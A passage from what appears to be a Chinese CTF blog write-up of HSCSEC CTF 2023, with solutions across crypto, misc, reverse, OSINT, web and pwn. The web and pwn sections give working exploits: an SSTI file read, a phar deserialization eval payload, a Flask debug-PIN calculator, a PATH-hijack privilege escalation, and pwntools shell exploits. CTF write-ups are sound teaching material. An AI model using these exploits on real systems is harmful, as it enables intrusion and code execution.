&quot;d83d,de18&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de10&quot;, &quot;d83d,de14&quot;, &quot;d83d,de20&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de11&quot;, &quot;d83d,de08&quot;, &quot;d83d,de11&quot;, &quot;d83d,de06&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de28&quot;, &quot;d83d,de14&quot;, &quot;d83d,de27&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de20&quot;, &quot;d83d,de21&quot;, &quot;d83d,de27&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de17&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de06&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de29&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de24&quot;, &quot;d83d,de08&quot;, &quot;d83d,de20&quot;, &quot;d83d,de16&quot;, &quot;d83d,de24&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de27&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de20&quot;, &quot;d83d,de18&quot;, &quot;d83d,de29&quot;, &quot;d83d,de02&quot;, &quot;d83d,de05&quot;, &quot;d83d,de03&quot;, &quot;d83d,de28&quot;, &quot;d83d,de1c&quot; ], [ &quot;d83d,de04&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de13&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de10&quot;, &quot;d83d,de15&quot;, &quot;d83d,de02&quot;, &quot;d83d,de27&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de12&quot;, &quot;d83d,de03&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de25&quot;, &quot;d83d,de04&quot;, &quot;d83d,de00&quot;, &quot;d83d,de09&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de04&quot;, &quot;d83d,de16&quot;, &quot;d83d,de03&quot;, &quot;d83d,de26&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de12&quot;, &quot;d83d,de11&quot;, &quot;d83d,de23&quot;, &quot;d83d,de20&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de27&quot;, &quot;d83d,de00&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de11&quot;, &quot;d83d,de00&quot;, &quot;d83d,de07&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de14&quot;, &quot;d83d,de01&quot;, &quot;d83d,de05&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de24&quot;, &quot;d83d,de07&quot; ], [ &quot;d83d,de16&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de08&quot;, &quot;d83d,de17&quot;, &quot;d83d,de12&quot;, &quot;d83d,de05&quot;, &quot;d83d,de03&quot;, &quot;d83d,de23&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de02&quot;, &quot;d83d,de14&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de16&quot;, &quot;d83d,de08&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de15&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de16&quot;, &quot;d83d,de05&quot;, &quot;d83d,de03&quot;, &quot;d83d,de14&quot;, &quot;d83d,de17&quot;, &quot;d83d,de15&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de02&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de04&quot;, &quot;d83d,de03&quot;, &quot;d83d,de01&quot;, &quot;d83d,de13&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de18&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de09&quot;, &quot;d83d,de15&quot;, &quot;d83d,de23&quot;, &quot;d83d,de07&quot;, &quot;d83d,de20&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de16&quot;, &quot;d83d,de26&quot;, &quot;d83d,de2f&quot; ], [ &quot;d83d,de0f&quot;, &quot;d83d,de13&quot;, &quot;d83d,de11&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de06&quot;, &quot;d83d,de16&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de18&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de16&quot;, &quot;d83d,de05&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de09&quot;, &quot;d83d,de07&quot;, &quot;d83d,de04&quot;, &quot;d83d,de11&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de11&quot;, &quot;d83d,de13&quot;, &quot;d83d,de29&quot;, &quot;d83d,de25&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de13&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de13&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de00&quot;, &quot;d83d,de25&quot;, &quot;d83d,de14&quot;, &quot;d83d,de24&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de17&quot;, &quot;d83d,de27&quot;, &quot;d83d,de20&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de09&quot;, &quot;d83d,de29&quot;, &quot;d83d,de17&quot;, &quot;d83d,de02&quot;, &quot;d83d,de24&quot;, &quot;d83d,de11&quot; ], [ &quot;d83d,de2e&quot;, &quot;d83d,de00&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de17&quot;, &quot;d83d,de13&quot;, &quot;d83d,de0a&quot;, &quot;d83d,de29&quot;, &quot;d83d,de20&quot;, &quot;d83d,de26&quot;, &quot;d83d,de27&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de25&quot;, &quot;d83d,de1f&quot;, &quot;d83d,de07&quot;, &quot;d83d,de2d&quot;, &quot;d83d,de23&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de02&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de14&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de01&quot;, &quot;d83d,de24&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de17&quot;, &quot;d83d,de20&quot;, &quot;d83d,de1b&quot;, &quot;d83d,de10&quot;, &quot;d83d,de03&quot;, &quot;d83d,de27&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de17&quot;, &quot;d83d,de2f&quot;, &quot;d83d,de25&quot;, &quot;d83d,de08&quot;, &quot;d83d,de28&quot;, &quot;d83d,de13&quot;, &quot;d83d,de29&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de02&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de13&quot;, &quot;d83d,de27&quot;, &quot;d83d,de00&quot;, &quot;d83d,de27&quot; ], [ &quot;d83d,de2d&quot;, &quot;d83d,de04&quot;, &quot;d83d,de10&quot;, &quot;d83d,de20&quot;, &quot;d83d,de06&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de07&quot;, &quot;d83d,de2a&quot;, &quot;d83d,de17&quot;, &quot;d83d,de04&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de24&quot;, &quot;d83d,de00&quot;, &quot;d83d,de08&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de2c&quot;, &quot;d83d,de06&quot;, &quot;d83d,de1a&quot;, &quot;d83d,de21&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de1d&quot;, &quot;d83d,de0d&quot;, &quot;d83d,de06&quot;, &quot;d83d,de1c&quot;, &quot;d83d,de09&quot;, &quot;d83d,de0b&quot;, &quot;d83d,de27&quot;, &quot;d83d,de22&quot;, &quot;d83d,de25&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de20&quot;, &quot;d83d,de2e&quot;, &quot;d83d,de09&quot;, &quot;d83d,de0c&quot;, &quot;d83d,de03&quot;, &quot;d83d,de1e&quot;, &quot;d83d,de28&quot;, &quot;d83d,de14&quot;, &quot;d83d,de13&quot;, &quot;d83d,de20&quot;, &quot;d83d,de2b&quot;, &quot;d83d,de10&quot;, &quot;d83d,de21&quot;, &quot;d83d,de0e&quot;, &quot;d83d,de18&quot;, &quot;d83d,de07&quot;, &quot;d83d,de0f&quot;, &quot;d83d,de25&quot; ]]print(len(s))num = [25588, 31114, 28727, 26722, 24948, 25135, 25480, 29029, 23025, 25775, 15411, 25423, 25202, 30031, 27380, 30734, 25054, 25109, 20741, 28568, 28802, 24591, 26063, 30940, 30375, 19411, 29573, 20845, 27232, 26743, 25779, 24986, 31498, 30978, 22945, 26563, 35012, 29994, 27016, 29535, 21342, 26573, 27569, 25408, 31567, 25503, 21385, 27207]dic = &#123;&#125;for i in range(48): for j in range(48): k = s[i][j] if k not in dic: dic[k] = [] dic[k].append((i,j))for k,v in dic.items(): x,y=k.split(&#x27;,&#x27;) x=int(x,16) y=int(y,16) z=(x - 55296) * 1024 + y - 56320 + 65536 - 128512 for t in v: num[z] -= t[0]*t[1]print(bytes(num))# b&#x27;\\x00\\x00\\x00\\x00\\x00\\x00369d9412-f5c8-4aa4-8056-a7e4369d4555\\x00\\x00\\x00\\x00\\x00\\x00&#x27; flag：flag&#123;369d9412-f5c8-4aa4-8056-a7e4369d4555&#125;。 ​ PWN无","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2023赛","slug":"2023赛","permalink":"https://lazzzaro.github.io/tags/2023%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"HSCSEC CTF 2023 (HSC-2th 2023)","slug":"match-HSCSEC-CTF-2023","date":"2023-02-12T14:23:55.000Z","updated":"2023-02-12T16:47:31.210Z","comments":true,"path":"2023/02/12/match-HSCSEC-CTF-2023/","permalink":"https://lazzzaro.github.io/2023/02/12/match-HSCSEC-CTF-2023/","excerpt":"","text":"​ 2023/02/11 00:00 UTC+8 - 2023/02/12 23:59 UTC+8 本届HSC-2th 2023是由中龙技术联合社会战队红客突击队（HSCSEC）举办。 本次比赛将采用在线网络安全夺旗挑战赛的形式，涵盖web,crypto,misc,reverse,pwn等主流方向，并面向全球开放。比赛三甲可获突击队周边礼品。前十名可获得合作伙伴赞助礼品以及实体证书。 Rank: 1 MISCSIGNIN 关注公众号：中龙 红客突击队 发送：HSCCTF{TELLMEFLAG}获取flag！ 公众号签到，HSCSEC&#123;W3Ic0m3_t0_HScCtF2tH&#125;。 ​ LINUX flag2为用户登录的密码下载：百度网盘：https://pan.baidu.com/s/1RMGpG391HbgWfOhwYmWx0A?pwd=HSC2提取码：HSC2腾讯网盘：https://share.weiyun.com/EyhLtHnF密码：jyk6t9奶牛快传： https://cowtransfer.com/s/d83e0de581aa49 点击链接查看 [ LINUX.rar ] ，或访问奶牛快传 cowtransfer.com 输入传输口令 xgzg82 查看； 非预期，直接16进制查看文件，搜字符串 HSCSEC&#123; 发现： 123456root@ubuntu:/home/ubuntu/Desktop# history 1 f1aG1:HSCSEC&#123;Lim3_ 2 exit 3 ubuntu20.04 4 historyroot@ubuntu:/home/ubuntu/Desktop# echo &quot;flag3:_iez&#125;&quot; &gt; /f1Ag3 连接得flag：HSCSEC&#123;Lim3_ubuntu20.04_iez&#125;。 ​ Salute解压得到 encode_salute 文件，尾部有 525d93ceb70e2bf5daa84ec3d0cd2c731a，md5查询得明文 qwer1234，以此为密钥与文件异或，还原得到rar文件。 文件里一张jpg图片一张png图片，用stegsolve查看png图片alpha0通道，有 flag2/key that_is 字样。 再以此为密码，用steghide提取jpg图片的隐藏信息：steghide extract -sf salute.jpg，得到flag文件内容 flag3:_c0ol&#125;。 连接为flag：HSCSEC&#123;qwer1234that_is_c0ol&#125;。 ​ EZIMGpng图片尾部有01串+反转的png，提取01串做二维码图，扫出内容 flag2:aQR_c0de_and；反转的png还原为新png图，反色处理得到 HSCSEC&#123;p3G_h。 少了第三部分，对新png图尝试使用PixelJihad解密，得到 _3nc&#125;。 连接为flag：HSCSEC&#123;p3G_haQR_c0de_and_3nc&#125;。 ​ Ancient-MISCDeduced gossip ☲☵ ☷☵☳ ☶空 ☷☵☳ ☶☱ ☶空 ☷空☱ ☶空 ☷☳☰ ☷☳☱ ☷☴☳ ☷☳☳ ☷☴☶ ☷☳☳ ☷☷☰ ☷☳空 ☰☴ ☷☴☶ ☷☴☶ ☷☴空 ☷空☲ 猜测为八卦+空一一对应9个数字，根据 HSCSEC&#123;&#125; 对应的九进制数，可知7个符号对应的数，剩下的2个测试即可。 最终对应 80 102 74 102 76 74 146 74 125 126 132 122 137 122 115 124 53 137 137 134 148 转换为十进制：72 83 67 83 69 67 123 67 104 105 110 101 115 101 95 103 48 115 115 112 125 转换为字符串：HSCSEC&#123;Chinese_g0ssp&#125;，还得手动补全单词才正确…… flag：HSCSEC&#123;Chinese_g0ssip&#125;。 ​ Watch the sky at night 斗木獬角木蛟奎木狼亢金龙 牛金牛女土蝠氐土貉井木犴虚日鼠房日兔心月狐鬼金羊 危月燕室火猪尾火虎柳土獐壁水貐箕水豹斗木獬牛金牛 女土蝠角木蛟亢金龙星日马虚日鼠张月鹿娄金狗翼火蛇 危月燕氐土貉房日兔轸水蚓室火猪心月狐井木犴胃土雉 壁水貐斗木獬鬼金羊柳土獐牛金牛尾火虎箕水豹女土蝠 虚日鼠昴日鸡柳土獐毕月乌危月燕觜火猴角木蛟星日马 室火猪参水猿奎木狼壁水貐斗木獬娄金狗牛金牛女土蝠 虚日鼠胃土雉张月鹿昴日鸡危月燕翼火蛇室火猪亢金龙 壁水貐斗木獬轸水蚓井木犴牛金牛氐土貉房日兔女土蝠 虚日鼠危月燕心月狐尾火虎室火猪鬼金羊柳土獐壁水貐 查到每三个字组成的词为28星宿里的一种，且根据方位分别归类到青龙、白虎、朱雀、玄武四大类中： 青龙：角木蛟、亢金龙、氐土貉、房日兔、心月狐、尾火虎、箕水豹玄武：斗木獬、牛金牛、女土蝠、虚日鼠、危月燕、室火猪、壁水貐白虎：奎木狼、娄金狗、胃土雉、昴日鸡、毕月乌、觜火猴、参水猿朱雀：井木犴、鬼金羊、柳土獐、星日马、张月鹿、翼火蛇、轸水蚓 按4进制分别替换为0-3，得到 1020 1103 1003 1103 1011 1003 1323 1003 1032 1133 1001 1232 1203 1221 1211 1232 1310 1133 1001 1100 1331。 转换为十进制：72 83 67 83 69 67 123 67 78 95 65 110 99 105 101 110 116 95 65 80 125 转换为字符串：HSCSEC&#123;CN_Ancient_AP&#125;。 ​ CRYPTOEZRSA 123456789101112131415from Crypto.Util.number import *import gmpy2from flag import mp = getPrime(1024)q = getPrime(1024)n = p * qprint(&#x27;n =&#x27;,n)e = 0x10001M = m * e * 1 * 2022 * pc = pow(M,e,n)print(&#x27;c =&#x27;,c)# n = 16266043783454053154037197753138388613864200794483663334493856481522764684650995230938142916968470804276539967429581472897698022852787399956166067156691430593337430691851251036378709799238876668312530223697905925939542713491015517460139150765778057817475571231361809654951289718071760502692960235551663466242938669673675870151921605230499603814070711617511206013584605131901906195136038060653121164252894949526861390984185085201067988694831398388037080993820517447099157891181179389949333832439004857436617834100885739716577641892686620423154860716308518151628754780994043553863224363539879909831811888663875989774849# c = 12716190507848578560760116589677996073721225715245215495257947887969923319693501568134141757778665747980229898129090929698368855086594836111461700857934476682700625486249555753323344759513528101651108919161794915999809784961533946922607642974500946026677116418317599095703217004064379100607278317877894742815660315660254853364776654303066021672567442581774299847661025422994141801987588151758971034155714424052693627277202951522779716696303237915400201362585413354036973117149974017434406560929491956957193491445847385625481870256240443170803497196783872213746269940877814806857222191433079944785910813364137603874411 $c = M^e \\bmod n = (2022mep)^e \\bmod n$，令 $c’ = c \\cdot (2022e)^{-e} \\bmod n = (mp)^e \\bmod n = (m^ep^{e-1} \\bmod n) \\cdot p$， 故 $\\gcd(c’,n)=p$，再利用常规RSA求解。 123456789101112n = 16266043783454053154037197753138388613864200794483663334493856481522764684650995230938142916968470804276539967429581472897698022852787399956166067156691430593337430691851251036378709799238876668312530223697905925939542713491015517460139150765778057817475571231361809654951289718071760502692960235551663466242938669673675870151921605230499603814070711617511206013584605131901906195136038060653121164252894949526861390984185085201067988694831398388037080993820517447099157891181179389949333832439004857436617834100885739716577641892686620423154860716308518151628754780994043553863224363539879909831811888663875989774849c = 12716190507848578560760116589677996073721225715245215495257947887969923319693501568134141757778665747980229898129090929698368855086594836111461700857934476682700625486249555753323344759513528101651108919161794915999809784961533946922607642974500946026677116418317599095703217004064379100607278317877894742815660315660254853364776654303066021672567442581774299847661025422994141801987588151758971034155714424052693627277202951522779716696303237915400201362585413354036973117149974017434406560929491956957193491445847385625481870256240443170803497196783872213746269940877814806857222191433079944785910813364137603874411e = 0x10001cc = c * inverse_mod(pow(2022*e,e,n),n)p = gcd(cc,n)q = n // pf = (p-1)*(q-1)d = inverse_mod(e,f)m = pow(cc,d,n) // pprint(bytes.fromhex(hex(m)[2:]))# b&#x27;flag&#123;3e5e2789a93a80615cc35edbff397c05&#125;&#x27; ​ Operator 1234567891011121314151617#!/bin/python3from Crypto.Util.number import bytes_to_long, getPrimeFLAG = &quot;*******************MASK****************&quot;# print(FLAG)number1 = getPrime(512)number2 = getPrime(1024)print(number1)result = FLAG * number1 % number2print(result)&quot;&quot;&quot;Output:114883593759168168187318682525591194001261745930416081708838185462547918464796644551201943503550870174777448283518061579301991574629130635135124214606784711890846045246997191702622225497063073251667816125412875121879991742654650976309481716690792328873189601779812108551290078049710826355501933349874438201643986975141068179879506727213209273645848165732801667704040761771&quot;&quot;&quot; $m$ 与 $n_1$ （512位）乘积的大小不会超过 $n_2$ 大小（1024位），故 $c=mn_1$。 123456n1 = 11488359375916816818731868252559119400126174593041608170883818546254791846479664455120194350355087017477744828351806157930199157462913063513512421460678471c = 1890846045246997191702622225497063073251667816125412875121879991742654650976309481716690792328873189601779812108551290078049710826355501933349874438201643986975141068179879506727213209273645848165732801667704040761771print(bytes.fromhex(hex(c//n1)[2:]))# b&#x27;flag&#123;qMmZqWvmj70bBsCfmVLT&#125;&#x27; ​ EZVC 123456789101112131415161718# -*- coding: utf-8 -*-import flagalphabet = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!&quot;#$%&amp;\\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~&#x27;key = &#x27;HSC&#x27;assert flag.startswith(&#x27;HSCSEC&#123;&#x27;)flag_num_list = []c = []for item in flag: flag_num_list.append(alphabet.find(item) + 1)key_num = alphabet.find(key) + 1for i in flag_num_list: m = (i + key_num) % 94 - 1 if m == 0: c.append(&quot;□&quot;) c.append(alphabet[m-1:m])print(&quot;c = &#123;&#125;&quot;.format(&#x27;&#x27;.join(c)))# c = GRBRDB`jg10ij2g01i,g201gi,2gi2,012igaigagi| 代码里面的 key_num 其实固定为0，实际当1，模运算也没啥用，实际是rot1凯撒加密，还原： 123456c = &#x27;GRBRDB`jg10ij2g01i,g201gi,2gi2,012igaigagi|&#x27;alphabet = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!&quot;#$%&amp;\\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~&#x27;flag = [alphabet[alphabet.index(k)+1] for k in c]print(&#x27;&#x27;.join(flag))# HSCSEC&#123;kh21jk3h12j-h312hj-3hj3-123jhbjhbhj&#125; ​ WEBEZSSTI基本没过滤的SSTI，尝试 ?name=&#123;&#123;sss.__init__.__globals__.__builtins__.open(\"/flag\").read()&#125;&#125; 报错无法打开 / ，说明 flag 被替换为空，双写绕过即可： ?name=&#123;&#123;sss.__init__.__globals__.__builtins__.open(\"/flflagag\").read()&#125;&#125; ​ EASYPHY查看首页源码，发现upload和view两个对话框包括关键字段 name=&quot;acti0n&quot;，抓包看到 ?acti0n=upload 的访问方式，为文件包含漏洞点。 通过设置 acti0n 参数和filter过滤器访问，得到 upload.php 和 view.php 源码。审计代码，upload.php 中包含上传文件与拦截过滤危险函数的功能，view.php 中有 eval() 函数，只需要修改类中的私有变量 $cmd 就可以拿到shell。 其中 file_exists() 函数结合文件上传可以想到phar反序列化漏洞利用。结合 upload.php 中关键字黑名单，使用 show_source() 函数读取 flag.php 文件。 构造phar文件： 12345678910111213141516171819202122&lt;?php class View &#123; public $dir; private $cmd; function __construct() &#123; $this-&gt;cmd = &#x27;show_source(&quot;flag.php&quot;);&#x27;; &#125; function __destruct() &#123; eval($this-&gt;cmd); &#125; &#125; $phar = new Phar(&#x27;phar.phar&#x27;); $phar -&gt; startBuffering(); $phar -&gt; setStub(&#x27;GIF89a&#x27;.&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;); $phar -&gt;addFromString(&#x27;test.txt&#x27;,&#x27;test&#x27;); $object = new View(); $phar -&gt; setMetadata($object); $phar -&gt; stopBuffering(); ?&gt; 本地运行生成 phar.phar，然后直接上传。文件上传成功之后，通过 delete 这个参数来触发 file_exists() 才可以利用phar，POST参数 delete=phar://phar.phar 即可拿到flag。 ​ EZSYFLASK有一个可以文件包含的路由：GET /view?filename=app.py，得到源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from flask import Flask,request,render_template_stringapp = Flask(__name__)@app.route(&quot;/&quot;)def index(): return &#x27;GET /view?filename=app.py&#x27;@app.route(&quot;/view&quot;)def viewFile(): filename = request.args.get(&#x27;filename&#x27;) if(&quot;flag&quot; in filename): return &quot;WAF&quot; if(&quot;cgroup&quot; in filename): return &quot;WAF&quot; if(&quot;self&quot; in filename): return &quot;WAF&quot; try: with open(filename, &#x27;r&#x27;) as f: templates=&#x27;&#x27;&#x27; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;文件存在&lt;/title&gt; &lt;/head&gt; &lt;h1&gt; &#123;&#125; &lt;/h1&gt; &lt;/html&gt; &#x27;&#x27;&#x27;.format(f.read()) return render_template_string(templates) except Exception as e: templates=&#x27;&#x27;&#x27; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;文件不存在&lt;/title&gt; &lt;/head&gt; &lt;h1&gt; 文件不存在 &lt;/h1&gt; &lt;/html&gt; &#x27;&#x27;&#x27; return render_template_string(templates)if __name__ == &quot;__main__&quot;: app.run(host=&quot;0.0.0.0&quot;, port=80, debug=True) 去除参数可以触发debug报错页，计算PIN值可以进入调试模式。由于禁用了 flag/self/cgroup，/proc/self/cgroup 获取不到，可以利用 /proc/1/mountinfo 获取docker-id： 12345678910111213141516171819202122232425262728293031323334353637383940414243# &gt;=3.8 sha1import hashlibfrom itertools import chainprobably_public_bits = [ &#x27;app&#x27;# /etc/passwd &#x27;flask.app&#x27;,# 默认值 &#x27;Flask&#x27;,# 默认值 &#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27; # 报错得到]private_bits = [ str(int(&#x27;0242ac0208fe&#x27;,16)),# /sys/class/net/eth0/address 16进制转10进制 #machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id 3./proc/1/mountinfo &#x27;7265fe765262551a676151a24c02b7b6&#x27;+&#x27;bcf34bfb0be38980dddd4de1d57a8b7da2de7843ee55ed110016b97f5163406c&#x27;]h = hashlib.sha1()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(&#x27;utf-8&#x27;) h.update(bit)h.update(b&#x27;cookiesalt&#x27;)cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20]num = Noneif num is None: h.update(b&#x27;pinsalt&#x27;) num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;) for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 输入PIN码进入调试模式，在根目录下发现 /flag 和 /readflag，/flag 无权限读，而 /readflag 有SUID权限，需要提权： 1234567cd /tmpecho \\&quot;/bin/bash\\&quot;&gt;pschmod 777 psecho $PATHexport PATH=/tmp:$PATHcd /./readflag 输入 print(os.popen(&quot;cd /tmp;echo \\&quot;/bin/bash\\&quot;&gt;ps;chmod 777 ps;echo $PATH;export PATH=/tmp:$PATH;cd /;./readflag&quot;).read()) 得flag。 ​ REVERSEDECOMPILEONEOONE照代码逻辑还原即可。 12345678910111213141516171819from Crypto.Util.number import *c = [0x5C797E8971697066,0x8D83497D7F6F7A3D,0x949DA8758277A9A5,0xB7954D7C]cc = []for k in c: cc += list(long_to_bytes(k)[::-1])for i in range(28): if (i&amp;1)!=0: cc[i] = cc[i]+i+1 else: cc[i] = cc[i]+i cc[i] ^= i + 1 cc[i] -= 3 * i + 1print(bytes(cc))# b&#x27;flag&#123;reV3rSe_1s_sucH_hanD1e&#125;&#x27; ​ Whack-a-mole动调过反调试和中间的判断条件，使得流程走向正确的处理函数里，最后在 Source 字符串中查看到已修改得到的字符串：w1n32_aP 和 i_iS_FUn，连接得flag：flag&#123;w1n32_aPi_iS_FUn&#125;。 ​ Base secretsrust程序，比较难看，结合题目 Base 跟踪一下代码逻辑，发现编码后的字符串 hexZh3tyVXM3X2AwX35yM+IxRU1nkz5nmWdzhXdF7Qo=。 跟进到encode代码部分，提取出码表为 456789+-IJKLMNOPQRSTUVWXghijklmnYZabcdefopqrstuvwxyz0123ABCDEFGH， base64解码得flag：flag&#123;rUs7_n0_pr0b1EM_s0_yisey&#125;。 ​ PWNEZPWN简单ret2shellcode。 12345678910from pwn import *context(arch=&#x27;amd64&#x27;)r=remote(&#x27;43.143.254.94&#x27;,10059)buf2=0x404080pl=asm(shellcraft.sh()).ljust(0x110,&#x27;a&#x27;)+p64(buf2)+p64(buf2)r.send(pl)r.interactive() ​ Morris II在 main() -&gt; fight_system() -&gt; confirm_input() -&gt; read() 中发现明显的栈溢出漏洞，有backdoor，再ret2text即可。 123456789101112131415#coding=utf-8from pwn import *r=remote(&#x27;43.143.254.94&#x27;,10396)dontlookatme=0x401236ret=0x40101ar.sendlineafter(&#x27;from below：&#x27;,&#x27;0&#x27;)r.recvuntil(&#x27;hero\\&#x27;s name!:\\n&#x27;)pl=&#x27;a&#x27;*(0x10+8)+p64(ret)+p64(dontlookatme)r.send(pl)r.interactive() ​ EasyHeap类似ctf-wiki的hacknote，UAF菜单题。 123456789101112131415161718192021222324252627282930313233343536373839from pwn import *r=remote(&#x27;43.143.254.94&#x27;,10575)elf=ELF(&#x27;./Safe_Program&#x27;)libc=ELF(&#x27;./libc-2.31.so&#x27;)def add(size, content): r.recvuntil(&quot;:&quot;) r.sendline(&quot;1&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(size)) r.recvuntil(&quot;:&quot;) r.sendline(content)def dele(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;2&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx))def show(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;3&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx)) magic = 0x80495BDadd(32, &quot;aaaa&quot;) # add note 0add(32, &quot;ddaa&quot;) # add note 1dele(0) # delete note 0dele(1) # delete note 1add(8, p32(magic)) # add note 2show(0) # show note 0r.interactive() ​ Safe Programret2libc，需要根据泄露地址查询libc为libc-2.31。 1234567891011121314151617181920212223242526272829from pwn import *r=remote(&#x27;43.143.254.94&#x27;,10914)elf=ELF(&#x27;./Safe_Program&#x27;)libc=ELF(&#x27;./libc-2.31.so&#x27;)pop_rdi=0x401393pop_rsi_r15=0x401391ret=0x40101aputs_plt=elf.plt.putsputs_got=elf.got.putsmain=0x401247r.recvuntil(&#x27;talk to me now:\\n\\n&#x27;)pl=&#x27;a&#x27;*(0x80+8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)r.send(pl)puts_addr=u64(r.recv(6)+&#x27;\\x00&#x27;*2)print(hex(puts_addr))libc_base=puts_addr-libc.sym.putsprint(hex(libc_base))system=libc_base+libc.sym.systembinsh=libc_base+libc.search(&#x27;/bin/sh\\x00&#x27;).next()r.recvuntil(&#x27;talk to me now:\\n\\n&#x27;)pl=&#x27;a&#x27;*(0x80+8)+p64(pop_rdi)+p64(binsh)+p64(pop_rsi_r15)+p64(0)*2+p64(system)+p64(main)r.send(pl)r.interactive() ​ Social EngineeringHappy Lantern Festival图片信息有阿勒泰市第十三届元宵灯会，搜索到举办地为五百里风情街，再在地图搜具体地址。 HSCSEC&#123;新疆维吾尔自治区阿勒泰地区阿勒泰市五百里风情街&#125; ​ Beautiful Lake放大图片发现宁夏理工学院，搜索宁夏理工学院附近的湖为星海湖，再在地图搜具体地址。 HSCSEC&#123;宁夏回族自治区石嘴山市大武口区星海湖&#125; ​ Apple Store百度识图，搜到地点为apple官方(西单大悦城店)，再在地图搜具体地址。 HSCSEC&#123;北京市西城区西单北大街131号&#125; ​ Beautiful Park百度识图，搜到新闻：华北最大的湿地公园位于碧桂园官厅蓝北侧 五一假期来这里玩水乘凉 看海棠花吧，得到公园名，再在地图搜具体地址。 HSCSEC&#123;河北省张家口市怀来县官厅水库国家湿地公园&#125; 